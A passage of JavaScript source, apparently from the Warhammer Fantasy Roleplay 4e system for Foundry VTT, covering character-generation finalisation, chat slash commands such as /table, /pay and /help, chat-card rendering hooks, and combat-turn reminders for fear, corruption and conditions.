    .reduce((prev, current) => prev.concat(current.changes), [])      // reduce effects to changes
    .filter(c => c.key.includes("characteristics"));                   // filter changes to characteristics

    let characteristics = foundry.utils.duplicate(this.data.characteristics);

    for (let ch in characteristics)
    {
      // Apply modifiers from item effects
      let changes = allChanges.filter(c => c.key.includes(`characteristics.${ch}`));
      let initialChanges = changes.filter(c => c.key.includes(`characteristics.${ch}.initial`));
      let modifierChanges = changes.filter(c => c.key.includes(`characteristics.${ch}.modifier`));

      let initialSum = initialChanges.reduce((prev, current) => prev += Number(current.value), 0);
      let modifierSum = modifierChanges.reduce((prev, current) => prev += Number(current.value), 0);

      characteristics[ch].initial += initialSum;
      characteristics[ch].total = characteristics[ch].initial + characteristics[ch].advances + modifierSum;
    }



    for(let key in this.data.skillAdvances)
    {
      let skill = await WFRP_Utility.findSkill(key);
      if (skill)
      {
        let ch = characteristics[skill.system.characteristic.value];
        if (ch && this.data.skillAdvances[key] > 0)
        {
          skills.push(`${key} (+${this.data.skillAdvances[key]}) ${ch.initial + ch.advances + this.data.skillAdvances[key]}`);
        }
      }
    }

    let exp = 0;
    for(let key in this.data.exp)
    {
      exp += this.data.exp[key];
    }

    this.data.fate.total = this.data.fate.allotted + this.data.fate.base;
    this.data.resilience.total = this.data.resilience.allotted + this.data.resilience.base;

    this.stages.forEach(stage => {
      stage.title ??= stage.class.title;
    });

    return {
      characteristics,
      speciesDisplay : this.data.subspecies ? `${game.wfrp4e.config.species[this.data.species]} (${game.wfrp4e.config.subspecies[this.data.species]?.[this.data.subspecies].name})` :  game.wfrp4e.config.species[this.data.species],
      stages: this.stages,
      data : this.data,
      stageHTML :  await this._getStageHTML(),
      skills : skills.join(", "),
      talents : this.data.items.talents?.map(i => i.name).join(", "),
      trappings : this.data.items.trappings?.map(i => i.name).join(", "),
      exp
    }
  }

  static async start()
  {
    let existing = localStorage.getItem("wfrp4e-chargen");
    if (existing)
    {
      let useExisting = await Dialog.wait({
        title : game.i18n.localize("CHARGEN.UseExistingData"),
        content : game.i18n.localize("CHARGEN.UseExistingDataContent"),
        buttons : {
          yes : {
            label : game.i18n.localize("Yes"),
            callback : () => {
              return true;
            }
          },
          no : {
            label : game.i18n.localize("No"),
            callback : () => {
              return false
            }
          }
        }
      });

      return new this(useExisting ? JSON.parse(existing) : null).render(true);
    }
    else
    {
      return new this().render(true);
    }
  }

  async _getStageHTML()
  {
    let html = [];

    for(let stage of this.stages)
    {
      html.push(await stage.app?.addToDisplay());
    }

    return html.filter(i => i).join("")
  }

  async _updateObject(ev, formData)
  {
    try {

      if (this.message)
        this.message.update({content : this.message.content + game.i18n.format("CHARGEN.Message.Created", {name : this.data.details.name})});

      this.actor.system.details.species.value = this.data.species;
      this.actor.system.details.species.subspecies = this.data.subspecies;

      for(let exp in this.data.exp)
      {
        if (Number.isNumeric(this.data.exp[exp]))
          this.actor.system.details.experience.total += Number(this.data.exp[exp]);
      }

      for(let key in this.data.items)
      {
        let items = this.data.items[key];
        if (!(items instanceof Array))
        {
          items = [items];
        }
        this.actor.items = this.actor.items.concat(items);
      }

      let money = await WFRP_Utility.allMoneyItems();

      money.forEach(m => m.system.quantity.value = 0);

      this.actor.items = this.actor.items.concat(money);

      // Get basic skills, add advancements (if skill advanced and isn't basic, find and add it)
      let skills = await WFRP_Utility.allBasicSkills();
      for(let skill in this.data.skillAdvances)
      {
        let adv = this.data.skillAdvances[skill];
        if (Number.isNumeric(adv))
        {
          let existing = skills.find(s => s.name == skill);

          if (!existing)
          {
            existing = await WFRP_Utility.findSkill(skill);
            existing = existing.toObject();
            skills.push(existing);
          }
          existing.system.advances.value += Number(adv);
        }
      }
      this.actor.items = this.actor.items.concat(skills);

      foundry.utils.mergeObject(this.actor.system.characteristics, this.data.characteristics, {overwrite : true});
      this.actor.system.status.fate.value = this.data.fate.base + this.data.fate.allotted;
      this.actor.system.status.resilience.value = this.data.resilience.base + this.data.resilience.allotted;

      this.actor.system.status.fortune.value =  this.actor.system.status.fate.value;
      this.actor.system.status.resolve.value =  this.actor.system.status.resilience.value;

      this.actor.system.details.move.value = this.data.move;

      this.actor.name = this.data.details.name || "New Character";
      this.actor.system.details.gender.value = this.data.details.gender;
      this.actor.system.details.age.value = this.data.details.age;
      this.actor.system.details.height.value = this.data.details.height;
      this.actor.system.details.haircolour.value = this.data.details.hair;
      this.actor.system.details.eyecolour.value = this.data.details.eyes;
      this.actor.system.details.motivation.value = this.data.details.motivation;
      this.actor.system.details["personal-ambitions"] = {
        "short-term" : this.data.details.short,
        "long-term" : this.data.details.long
      };

      foundry.utils.mergeObject(this.actor, foundry.utils.expandObject(this.data.misc), {overwrite : true});


      this.actor.items = this.actor.items.filter(i => {
        if (i.type == "skill")
        {
          // Include any skill with advances
          if (i.system.advances.value > 0)
          {
            return true
          }
          // or include any basic skill that isn't a specialization
          if (i.system.advanced.value == "bsc" && i.system.grouped.value == "noSpec")
          {
            return true;
          }
          // or include any basic skill that IS a specialisation (but not specialised, i.e. Art, or Ride)
          if(i.system.advanced.value == "bsc" && i.system.grouped.value == "isSpec" && !i.name.includes("(") && !i.name.includes(")")) 
          {
            return true
          }
          else return false;
        }
        else // Return true if any other item besides skills
        {
          return true
        };
      }).map(i => {
        return i instanceof ItemWfrp4e ? i.toObject() : i
      });

      if (game.user.isGM || game.settings.get("core", "permissions").ACTOR_CREATE.includes(game.user.role))
      {
        let document = await Actor.create(this.actor);
        document.sheet.render(true);
        localStorage.removeItem("wfrp4e-chargen");
      }
      else {
        // Create temp actor to handle any immediate scripts
        let tempActor = await Actor.create(this.actor, {temporary: true});
        for(let i of tempActor.items.contents)
        {
          await i._preCreate(i._source, {}, game.user.id);
        }
        const payload =  {id : game.user.id, data : tempActor.toObject()};
        let id = await game.wfrp4e.socket.executeOnUserAndWait("GM", "createActor", payload);
        let actor = game.actors.get(id);
        if (actor && actor.isOwner) {
          actor.sheet.render(true);
          localStorage.removeItem("wfrp4e-chargen");
        }
      }
    }
    catch(e)
    {
      ui.notifications.error(game.i18n.format("CHARGEN.ERROR.Create", {error: e}));
    }
  }

  complete(stageIndex) {
    this.stages[stageIndex].complete = true;
    Hooks.call("wfrp4e:chargenStageCompleted", this, this.stages[stageIndex]);
    localStorage.setItem("wfrp4e-chargen", JSON.stringify({data : this.data, stages : this.stages}));
    this.render(true);
  }

  canStartStage(stage)
  {
    if (!stage)
      return false

    let dependancies = stage.dependantOn.map(i => this.stages.find(s => s.key == i));
    return dependancies.every(stage => stage.complete)

  }

  addStage(stage, index, stageData = {}) {
    let stageObj = stage.stageData();
    stageObj = foundry.utils.mergeObject(stageObj, stageData);

    if (index === undefined) {
      this.stages.push(stageObj);
    } else { // Insert new stage in specified index
      let newStages = this.stages.slice(0, index);
      newStages.push(stageObj);
      newStages = newStages.concat(this.stages.slice(index));
      this.stages = newStages;
    }
  }

  replaceStage(key, stage)
  {
    let existing = this.stages.find(i => i.key == key);
    if (existing)
    {
      existing.class = stage;
    }
  }


  activateListeners(html) {
    super.activateListeners(html);

    html.find(".chargen-button").on("click", ev => {
      let stage = this.stages[Number(ev.currentTarget.dataset.stage)];

      if (!this.canStartStage(stage))
      {
        return ui.notifications.error(game.i18n.format("CHARGEN.ERROR.StageStart", {stage : stage.dependantOn.toString()}))
      }

      if (stage.app)
        stage.app.render(true);
      else {
        stage.app = new stage.class(
          this.data,
          {
            complete : this.complete.bind(this), // Function used by the stage to complete itself
            index : Number(ev.currentTarget.dataset.stage),
            message : this.message
          });
        stage.app.render(true);
      }
    });
  }
}

function chat() {

  // Activate chat listeners defined in chat-wfrp4e.js
  Hooks.on('renderChatLog', (log, html, data) => {
    ChatWFRP.chatListeners(html);
  });


  // Add Apply Condition buttons
  Hooks.on("preCreateChatMessage", (msg) => {
    msg.updateSource({"content" : ChatWFRP.addEffectButtons(msg.content)});
  });

  
  Hooks.on("createChatMessage", (msg) => {
    let test = msg.getTest();
    if (test)
    {
      test.postTestGM(msg);
    }
  });




  /**
   * Primary use of this hook is to intercept chat commands.
   * /char  - Begin character generation
   * /table - Roll on a table
   * /cond  - Lookup a condition
   * /name  - Generate a name
   * /avail - Start an item availability test
   * /pay - Player: Remove money from character. GM: Start a payment request
   * /credit - Player: Not allowed. GM: Start a credit request to send money to players
   * /help - display a help message on all the commands above
   */
  Hooks.on("chatMessage", (html, content, msg) => {
    // Setup new message's visibility
    let rollMode = game.settings.get("core", "rollMode");
    if (["gmroll", "blindroll"].includes(rollMode)) msg["whisper"] = ChatMessage.getWhisperRecipients("GM").map(u => u.id);
    if (rollMode === "blindroll") msg["blind"] = true;

    let regExp;
    regExp = /(\S+)/g;
    let commands = content.match(regExp);
    let command = commands[0];

    // Roll on a table
    if (command === "/table") {
      // If no argument, display help menu
      if (commands.length === 1)
      {
        game.wfrp4e.tables.formatChatRoll("menu").then(text => {
          if (!text)
            return
          msg.content = text;
          msg.speaker = {alias: "Table Menu"};
          ChatMessage.create(msg);
        });
      }
      else {
        // [0]: /table [1]: <table-name> [2]: argument1 [3]: argument2
        let modifier, column; // Possible arguments
        // If argument 1 is a number use it as the modifier
        if (!isNaN(commands[2])) {
          modifier = parseInt(commands[2]);
          column = commands[3];
        } else // if argument 1 is not a number, use it as column
        {
          modifier = parseInt(commands[3]),
            column = commands[2];
        }
        // Call tables class to roll and return html
        game.wfrp4e.tables.formatChatRoll(commands[1], { modifier: modifier, showRoll : true }, column).then(text => {          
          if (!text)
            return
          msg.content = text;
          ChatMessage.create(msg);
        });
      }
      return false;
    }
    // Lookup a condition
    else if (command === "/cond") {
      // Only one argument possible [1]: condition to lookup
      let conditionInput = commands[1].toLowerCase();
      // Don't require spelling, match the closest condition to the input
      let closest = WFRP_Utility.matchClosest( game.wfrp4e.config.conditions, conditionInput);
      if (! game.wfrp4e.config.conditionDescriptions) {
        ui.notifications.error("No content found");
        return false
      }
      let description =  game.wfrp4e.config.conditionDescriptions[closest];
      let name =  game.wfrp4e.config.conditions[closest];

      // Create message and return false to not display user input of `/cond`
      msg.content = `<b>${name}</b><br>${description}`;
      ChatMessage.create(msg);
      return false;
    }
    // Lookup an item property
    else if (command === "/prop")
    {
      let propertyInput = commands[1].toLowerCase();
      let allProperties = game.wfrp4e.utility.allProperties();
      let closest = WFRP_Utility.matchClosest( game.wfrp4e.utility.allProperties(), propertyInput);

      let description = game.wfrp4e.config.qualityDescriptions[closest] || game.wfrp4e.config.flawDescriptions[closest];
      let name =  allProperties[closest];

      msg.content = `<b>${name}</b><br>${description}`;
      ChatMessage.create(msg);
      return false;
    }

    // Character generation
    else if (command === "/char") {
      CharGenWfrp4e.start();
      return false;
    }
    // Name generation
    else if (command === "/name") {
      // Possible arguments - [2]: gender, [1]: species
      let gender = (commands[2] || "").toLowerCase();
      let species = (commands[1] || "").toLowerCase();
      // Call generator class to create name, create message, return false to not display user input of `/name`
      let name = NameGenWfrp.generateName({ species, gender });
      ChatMessage.create(WFRP_Utility.chatDataSetup(name));
      return false;
    }
    // Availability test
    else if (command === "/avail") {
      let modifier = 0;
      // Possible arguments - [1]: settlement size, [2]: item rarity [3*]: modifier

      let settlement = (commands[1] || "").toLowerCase();
      let rarity = (commands[2] || "").toLowerCase();
      if (!isNaN(commands[3])) {
        modifier = commands[3];
      }

      // Call generator class to start the test, create message, send to chat, return false to not display user input of `/avail`
      MarketWfrp4e.testForAvailability({ settlement, rarity, modifier });
      return false;
    }
    // Pay commands
    else if (command === "/pay") {
      //The parameter is a string that will be exploded by a regular expression
      let amount = commands[1];
      let playerOrActor = commands.slice(2, commands.length).join(" ");
      //If the user isnt a GM, he pays a price
      if (!game.user.isGM) {
        let actor = WFRP_Utility.getSpeaker(msg.speaker);
        let money = MarketWfrp4e.payCommand(amount, actor);
        if (money)
          actor.updateEmbeddedDocuments("Item", money);
      } else {
        if ( playerOrActor.length > 0) {  // Valid actor/option
          let actor = game.actors.find(a => a.name.toLowerCase().includes(playerOrActor.toLowerCase() ) );
          if ( actor ) {
            let p = game.users.players.find(p => p.character?.id === actor.id && p.active);
            if (actor.hasPlayerOwner && p ) { 
                playerOrActor = p.name; // In this case, replace the actor by the player name for chat card, as usual
              } else {
                MarketWfrp4e.directPayCommand(amount,actor); // No player/Not active -> substract money
                return false;
              }
          }
        }
        // Default choice, display chat card
        MarketWfrp4e.generatePayCard(amount, playerOrActor);
      }
      return false;
    }

    // Credit commands
    else if (command === "/credit") {
      let amount = commands[1];
      let playerOrActorOrCommand = commands.slice(2, commands.length).join(" ");

      // If hes a gm, it generate a "Credit" card for all the player.
      if (game.user.isGM) {
        MarketWfrp4e.processCredit(amount, playerOrActorOrCommand);
      } else {
        //If the user isnt a GM, he can't use the command (for now)
        message = `<p>${game.i18n.localize("MARKET.CreditCommandNotAllowed")}</p>`;
        ChatMessage.create(WFRP_Utility.chatDataSetup(message, "roll"));
      }
      return false;
    }

    else if (command === "/corruption") {
      WFRP_Utility.postCorruptionTest(commands[1]);
      return false;
    }


    else if (command === "/fear") {
      WFRP_Utility.postFear(commands[1], commands.slice(2).join(" "));
      return false;
    }

    else if (command === "/terror") {
      WFRP_Utility.postTerror(commands[1], commands.slice(2).join(" "));
      return false;
    }


    else if (command === "/exp") {
      WFRP_Utility.postExp(commands[1], commands.slice(2).join(" "));
      return false;
    }

    // Travel commands
    else if (command === "/travel") {
      TravelDistanceWfrp4e.displayTravelDistance( commands[1], commands[2] );
      return false;
    }

    else if (command === "/trade") {
      game.wfrp4e.trade.attemptBuy();
      return false;
    }

    

    //Help commands
    else if (command === "/help") {
      let rawCommands = game.i18n.localize("CHAT.CommandLine.Help.Commands");

      let commandElements = rawCommands.split(",").map(function (item) {
        return {
          title: game.i18n.localize(`CHAT.CommandLine.Help.${item}.Title`),
          command: game.i18n.localize(`CHAT.CommandLine.Help.${item}.Usage.Command`),
          commandLabel: game.i18n.localize(`CHAT.CommandLine.Help.Label.Command`),
          example: game.i18n.localize(`CHAT.CommandLine.Help.${item}.Usage.Example`),
          exampleLabel: game.i18n.localize(`CHAT.CommandLine.Help.Label.Example`),
          note: game.i18n.localize(`CHAT.CommandLine.Help.${item}.Usage.Note`),
          noteLabel: game.i18n.localize(`CHAT.CommandLine.Help.Label.Note`),
        };
      });

      let link = game.i18n.format("CHAT.CommandLine.Help.Link", { link: "https://github.com/moo-man/WFRP4e-FoundryVTT/wiki" });

      renderTemplate("systems/wfrp4e/templates/chat/help/chat-help-command.hbs", {
        commands: commandElements,
        link: link
      }).then(html => {
        let chatData = WFRP_Utility.chatDataSetup(html, "selfroll");
        ChatMessage.create(chatData);
      });
      return false;
    }
  });


  /**
 * Searches each message and adds drag and drop functionality and hides certain things from players
 */

  Hooks.on("renderChatMessage", async (app, html) => {

    WFRP_Utility.addLinkSources(html);
    // Hide test data from players (35 vs 50) so they don't know the enemy stats
    if (game.settings.get("wfrp4e", "hideTestData") && !game.user.isGM && html.find(".chat-card").attr("data-hide") === "true") {
      html.find(".hide-option").remove();
    }
    // Hide chat card edit buttons from non-gms
    if (!game.user.isGM) {
      html.find(".chat-button-gm").remove();
      html.find(".haggle-buttons").remove();
      // Hide these if actor is not owned by the player
      if (!app.speaker.actor || (app.speaker.actor && !game.actors.get(app.speaker.actor).isOwner))
      {
        html.find(".chat-button-player").remove();
        html.find(".test-breakdown").remove();
        html.find(".damage-breakdown").remove();
        html.find(".hide-spellcn").remove();
      }
      if (!app.getOppose()?.defender?.isOwner)
      {
        html.find(".opposed-options").remove();
      }
    }
    else {
      html.find(".chat-button-player").remove();
    }


    // Do not display "Blind" chat cards to non-gm
    if (html.hasClass("blind") && !game.user.isGM) {
      html.find(".message-header").remove(); // Remove header so Foundry does not attempt to update its timestamp
      html.html("").css("display", "none");
    }

    // Add drag and drop functonality to posted items
    let postedItem = html.find(".post-item")[0];
    if (postedItem) {
      postedItem.setAttribute("draggable", true);
      postedItem.classList.add("draggable");

      postedItem.addEventListener('dragstart', ev => {
        if (app.flags.postQuantity == "inf" || app.flags.postQuantity == undefined)
          return ev.dataTransfer.setData("text/plain", app.flags.transfer);

        if (game.user.isGM)
        {
          ev.dataTransfer.setData("text/plain", app.flags.transfer);
          let newQuantity = app.flags.postQuantity - 1;
          let recreateData = app.flags.recreationData;
          recreateData.postQuantity = newQuantity;
          renderTemplate("systems/wfrp4e/templates/chat/post-item.hbs", recreateData).then(html => {
            app.update({ "flags.postQuantity": newQuantity, content : TextEditor.enrichHTML(html) });
            if (newQuantity <= 0)
              app.delete();
          });

        }
        else
        {
          let newQuantity = app.flags.postQuantity - 1;

          if (app.flags.postQuantity)
            ev.dataTransfer.setData("text/plain", app.flags.transfer);


          if (newQuantity == 0) {
            game.socket.emit("system.wfrp4e", {
              type: "deleteMsg",
              payload: {
                "id": app.id
              }
            });
            return false
          }
          else {
            ev.dataTransfer.setData("text/plain", app.flags.transfer);
            let recreateData = app.flags.recreationData;
            recreateData.postQuantity = newQuantity;
            renderTemplate("systems/wfrp4e/templates/chat/post-item.hbs", recreateData).then(html => {

              game.socket.emit("system.wfrp4e", {
                type: "updateMsg",
                payload: {
                  "id": app.id,
                  "updateData": { "flags.postQuantity": newQuantity, content: TextEditor.enrichHTML(html) }
                }
              });
            });
          }
        }
      });
    }

    // Add drag and drop to character generation results
    let woundsHealed = html.find(".wounds-healed-drag")[0];
    if (woundsHealed) {
      woundsHealed.setAttribute("draggable", true);
      woundsHealed.addEventListener('dragstart', ev => {
        let dataTransfer = {
          type : "wounds",
          payload : app.flags.testData.result.woundsHealed
        };
        ev.dataTransfer.setData("text/plain", JSON.stringify(dataTransfer));
      });
    }

    // Add drag and drop to character generation results
    let generation = html.find(".char-gen")[0];
    if (generation) {
      generation.setAttribute("draggable", true);
      generation.addEventListener('dragstart', ev => {
        ev.dataTransfer.setData("text/plain", app.flags.transfer);
      });
    }


    // Add drag and drop to money from income rolls
    html.find(".money-drag").each(function () {
      let amount = $(this)[0];
      amount.setAttribute("draggable", true);
      amount.addEventListener('dragstart', ev => {
        let dataTransfer = {
          type : "money",
          payload: $(amount).attr("data-amt")
        };
        ev.dataTransfer.setData("text/plain", JSON.stringify(dataTransfer));
      });
    });

    WFRP_Utility.replacePopoutTokens(html);

    // if (app.getFlag("wfrp4e", "roleTests"))
    // {
    //   let tests = app.getFlag("wfrp4e", "roleTests").map(i => game.messages.get(i)?.getTest()).filter(i => i);
    //   let SL = tests.reduce((sl, test) => sl + test.result.crewTestSL, 0); 
    //   let slCounter = html.find(".sl-total")[0]
    //   slCounter.innerText = slCounter.innerText.replace("%SL%", SL);
    // }

  });

  Hooks.on("deleteChatMessage", async (message) => {
    let targeted = message.flags.unopposeData; // targeted opposed test
    let manual = message.flags.opposedStartMessage; // manual opposed test
    if (!targeted && !manual)
      return;

    if (targeted) {
      let target = canvas.tokens.get(message.flags.unopposeData.targetSpeaker.token);
      await target.actor.clearOpposed();
    }
    if (manual && !message.flags.opposeResult && OpposedWFRP.attackerMessage) {
      await OpposedWFRP.attackerMessage.update(
        {
          "flags.data.isOpposedTest": false
        });
      await OpposedWFRP.attacker.clearOpposed();
    }
    ui.notifications.notify(game.i18n.localize("ROLL.CancelOppose"));
  });

}

class CombatHelpers {


    static scripts = {
        startCombat: [CombatHelpers.checkFearTerror],
        endCombat: [CombatHelpers.clearCombatantAdvantage, CombatHelpers.checkCorruption, CombatHelpers.checkInfection, CombatHelpers.checkDiseases],
        startTurn: [CombatHelpers.checkStartTurnConditions],
        endTurn: [CombatHelpers.checkEndTurnConditions],
        endRound: [CombatHelpers.checkEndRoundConditions, CombatHelpers.fearReminders]
    }

    static async preUpdateCombat(combat, updateData, context) {
        const previousId = combat.combatant?.id;
        const path = "wfrp4e.previousCombatant";
        foundry.utils.setProperty(context, path, previousId);
    
        const prevPath = "wfrp4e.previousTR";
        const prevTR = { T: combat.turn, R: combat.round };
        foundry.utils.setProperty(context, prevPath, prevTR);
    
        const startedPath = "wfrp4e.started";
        const prevStarted = combat.started;
        foundry.utils.setProperty(context, startedPath, prevStarted);
    }

    static async updateCombatStart(combat, _, context) {
        const was = foundry.utils.getProperty(context, `wfrp4e.started`);
        const is = combat.started;
        if (was || !is) return;

        for (let script of CombatHelpers.scripts.startCombat) {
            await script(combat);
        }
        for (let turn of combat.turns) {
            await Promise.all(turn.actor.runScripts("startCombat", {combat}, true));
            Hooks.callAll("wfrp4e:startCombat", combat);
        }
    }

    static async updateCombat(combat, changes, context) {
        let cTurn = combat.current.turn;
        let pTurn = foundry.utils.getProperty(context, `wfrp4e.previousTR.T`);
        let cRound = combat.current.round;
        let pRound = foundry.utils.getProperty(context, `wfrp4e.previousTR.R`);

        // no change in turns nor rounds.
        if (changes.turn === undefined && changes.round === undefined) return;
        // combat not started or not active.
        if (!combat.started || !combat.isActive) return;
        // we went back.
        if (cRound < pRound || (cTurn < pTurn && cRound === pRound)) return;
    
        // retrieve combatants.
        const currentCombatant = combat.combatant;
        const previousId = foundry.utils.getProperty(context, `wfrp4e.previousCombatant`);
        const wasStarted = foundry.utils.getProperty(context, `wfrp4e.started`);
        const previousCombatant = wasStarted ? combat.combatants.get(previousId) : null;

        if (combat.round != 1 && combat.turns && combat.active) {
            if (cRound > 1 && combat.current.turn == 0) {
                for (let script of CombatHelpers.scripts.endRound) {
                    await script(combat);
                }
                
                for (let turn of combat.turns) {
                    await Promise.all(turn.actor.runScripts("endRound", {combat}, true));
                    Hooks.callAll("wfrp4e:endRound", combat);
                }
            }
        }
        
        if (previousCombatant) {
            for (let script of CombatHelpers.scripts.endTurn) {
                await script(combat, previousCombatant);
            }
            await Promise.all(previousCombatant.actor.runScripts("endTurn", {combat, previousCombatant}, true));
            Hooks.callAll("wfrp4e:endTurn", combat, previousCombatant);
        }
        if (currentCombatant) {
            for (let script of CombatHelpers.scripts.startTurn) {
                await script(combat, currentCombatant);
            }
            await Promise.all(currentCombatant.actor.runScripts("startTurn", {combat, currentCombatant}, true));
            Hooks.callAll("wfrp4e:startTurn", combat, currentCombatant);
        }
    }

    static async checkStartTurnConditions(combat, combatant) {
        if (!game.user.isUniqueGM)
            return

        if (combatant) {
            if (combatant.actor.hasSystemEffect("dualwielder")) {
                await combatant.actor.removeSystemEffect("dualwielder");
            }

            if (game.settings.get("wfrp4e", "statusOnTurnStart")) {
                let nameOverride =  combat.combatant.hidden ? "???" : combatant.name;
                combatant.actor.displayStatus(combat.round, nameOverride);
            }

            if (game.settings.get("wfrp4e", "focusOnTurnStart")) {
                canvas.tokens.get(combatant.token.id).control();
                canvas.tokens.cycleTokens(1, true);
            }

            let msgContent = "";
            let startTurnConditions = combatant.actor.effects.contents.filter(e => e.applicationData?.conditionTrigger == "startTurn");
            for (let cond of startTurnConditions) {
                    let conditionName = game.i18n.localize(game.wfrp4e.config.conditions[cond.conditionId]);
                    if (Number.isNumeric(cond.flags.wfrp4e.value))
                        conditionName += ` ${cond.flags.wfrp4e.value}`;
                    msgContent = `
                <h2>${conditionName}</h2>
                <a class="condition-script" data-combatant-id="${combatant.id}" data-cond-id="${cond.conditionId}">${game.i18n.format("CONDITION.Apply", { condition: conditionName })}</a>`;
                    await ChatMessage.create({ content: msgContent, speaker: { alias: combatant.token.name } });
            }

        }
        WFRP_Audio.PlayContextAudio({ item: { type: 'round' }, action: "change" });
    }

    static async checkEndTurnConditions(combat, combatant) {
        if (!game.user.isUniqueGM)
            return

        if (combatant) {
            let msgContent = "";
            let endTurnConditions = combatant.actor.effects.contents.filter(e => e.applicationData?.conditionTrigger == "endTurn");
            for (let cond of endTurnConditions) {
                    let conditionName = game.i18n.localize(game.wfrp4e.config.conditions[cond.conditionId]);
                    if (Number.isNumeric(cond.flags.wfrp4e.value))
                        conditionName += ` ${cond.flags.wfrp4e.value}`;
                    msgContent = `
                <h2>${conditionName}</h2>
                <a class="condition-script" data-combatant-id="${combatant.id}" data-cond-id="${cond.conditionId}">${game.i18n.format("CONDITION.Apply", { condition: conditionName })}</a>`;
                    await ChatMessage.create({ content: msgContent, speaker: { alias: combatant.token.name } });
            }
        }
    }

    static async endCombat(combat) {
        if (!game.user.isUniqueGM)
            return

        let content = "";
        let scriptResult = "";
        for (let script of CombatHelpers.scripts.endCombat) {
            scriptResult = await script(combat);
            if (scriptResult) {
                content += scriptResult + "<br><br>";
            }
        }
        if (content) {
            content = `<h2>${game.i18n.localize("CHAT.EndCombat")}</h3>` + content;
            ChatMessage.create({ content, whisper: ChatMessage.getWhisperRecipients("GM") });
        }
        for (let turn of combat.turns) {
            await Promise.all(turn.actor.runScripts("endCombat", {combat}, true));
            Hooks.callAll("wfrp4e:endCombat", combat);
        }
    }

    static async checkFearTerror(combat) {
        if (!game.user.isUniqueGM)
            return

        let fearCounters = [];
        let terrorCounters = [];
        for (let turn of combat.turns) {
            try {

            let fear = turn.actor.has(game.i18n.localize("CHAT.Fear"));
            if (fear)
                fearCounters.push({ name: turn.name, value: `@Fear[${fear.specification.value},${turn.name}]` });

            let terror = turn.actor.has(game.i18n.localize("CHAT.Terror"));
            if (terror)
                terrorCounters.push({ name: turn.name, value: `@Terror[${terror.specification.value},${turn.name}]` });

            }
            catch (e) {
                console.log(e);
            }
        }
        let msg = "";
        if (fearCounters.length || terrorCounters.length) {
            if (fearCounters.length)
                msg += `<h2>${game.i18n.localize("CHAT.Fear")}</h2>${fearCounters.map(f => `<b>${f.name}</b> - ${f.value}`).join("<br>")}`;
            if (terrorCounters.length)
                msg += `<h2>${game.i18n.localize("CHAT.Terror")}</h2>${terrorCounters.map(t => `<b>${t.name}</b> - ${t.value}`).join("<br>")}`;

        }

        msg += CombatHelpers.checkSizeFearTerror(combat);

        if (msg)
            await ChatMessage.create({ content: msg });
    }

    static checkSizeFearTerror(combat) {
        let sizeMap = {};
        let msg = "";
        for (let turn of combat.turns) {
            sizeMap[turn.name] = turn.actor.sizeNum;
        }
        for (let actor in sizeMap) {
            let size = sizeMap[actor];
            let smallerBy = {
                1: [],
                2: [],
                3: [],
                4: [],
                5: [],
                6: []
            };

            for (let otherActor in sizeMap) {
                if (otherActor == actor)
                    continue
                try {
                    if (size > sizeMap[otherActor])
                        smallerBy[size - sizeMap[otherActor]].push(otherActor);
                }
                catch (e) {

                }
            }

            if (smallerBy[1].length)
                msg += game.i18n.format("CHAT.CausesFear", { fear: `@Fear[${1}, ${actor}]`, actor: actor, target: smallerBy[1].join(", ")});

            if (smallerBy[2].length)
                msg += game.i18n.format("CHAT.CausesFear", { fear: `@Terror[${2}, ${actor}]`, actor: actor, target: smallerBy[2].join(", ")});

            if (smallerBy[3].length)
                msg += game.i18n.format("CHAT.CausesFear", { fear: `@Terror[${3}, ${actor}]`, actor: actor, target: smallerBy[3].join(", ")});

            if (smallerBy[4].length)
                msg += game.i18n.format("CHAT.CausesFear", { fear: `@Terror[${4}, ${actor}]`, actor: actor, target: smallerBy[4].join(", ")});

            if (smallerBy[5].length)
                msg += game.i18n.format("CHAT.CausesFear", { fear: `@Terror[${5}, ${actor}]`, actor: actor, target: smallerBy[5].join(", ")});

            if (smallerBy[6].length)
                msg += game.i18n.format("CHAT.CausesFear", { fear: `@Terror[${6}, ${actor}]`, actor: actor, target: smallerBy[6].join(", ")});

            if (Object.values(smallerBy).some(list => list.length)) {
                msg += "<br>";
            }
        }
        if (msg) {
            msg = `<br><h2>${game.i18n.localize("Size")}</h2>${msg}`;
        }
        return msg
    }

    static async checkCorruption(combat) {
        if (!game.user.isUniqueGM)
            return

        let corruptionCounters = [];

        for (let turn of combat.turns) {
            let corruption = turn.actor.has(game.i18n.localize("NAME.Corruption"));
            if (corruption) {
                let existing = corruptionCounters.find(c => c.type == corruption.specification.value);
                if (existing)
                    existing.counter++;
                else
                    corruptionCounters.push({ counter: 1, type: corruption.specification.value });
            }
        }

        let content = "";

        if (corruptionCounters.length) {
            content += `<h3><b>${game.i18n.localize("Corruption")}</b></h3>`;
            for (let corruption of corruptionCounters) {
                content += `${corruption.counter} ${corruption.type}<br>`;
            }
            content += game.i18n.localize("CHAT.CorruptionTest");
            content += `<br>@Corruption[Minor]<br>@Corruption[Moderate]<br>@Corruption[Major]`;
        }
        return content
    }

    static async checkInfection(combat) {
        if (!game.user.isUniqueGM)
            return

        let minorInfections = combat.getFlag("wfrp4e", "minorInfections") || [];
        let content = "";
        if (minorInfections.length) {
            content += `<h3><b>${game.i18n.localize("Minor Infections")}</b></h3>${game.i18n.localize("CHAT.InfectionReminder")}<br>`;
            for (let actor of minorInfections) {
                content += `<br><b>${actor}</b>`;
            }
        }
        return content
    }

    static async checkDiseases(combat) {
        if (!game.user.isUniqueGM)
            return

        let diseaseCounters = [];

        for (let turn of combat.turns) {
            let disease = turn.actor.has(game.i18n.localize("NAME.Disease"));
            if (disease) {
                let existing = diseaseCounters.find(d => d.type == disease.specification.value);
                if (existing)
                    existing.counter++;
                else
                    diseaseCounters.push({ counter: 1, type: disease.specification.value });
            }
        }
        let content = "";

        if (diseaseCounters.length) {
            content += `<h3><b>${game.i18n.localize("Diseases")}</b></h3>`;
            for (let disease of diseaseCounters)
                content += `${disease.counter} <a class="item-lookup" data-type="disease" data-open="sheet">${disease.type}</a><br>`;

            content += game.i18n.localize("CHAT.DiseasesRules");
        }
        return content
    }

    static async checkEndRoundConditions(combat) {
        if (!game.user.isUniqueGM)
            return

        let removedConditions = [];
        let msgContent = "";
        for (let turn of combat.turns) {
            let endRoundConditions = turn.actor.effects.contents.filter(e => e.applicationData?.conditionTrigger == "endRound");
            for (let cond of endRoundConditions) {
                let conditionName = game.i18n.localize(game.wfrp4e.config.conditions[cond.conditionId]);
                if (Number.isNumeric(cond.flags.wfrp4e.value))
                    conditionName += ` ${cond.flags.wfrp4e.value}`;
                msgContent = `
            <h2>${conditionName}</h2>
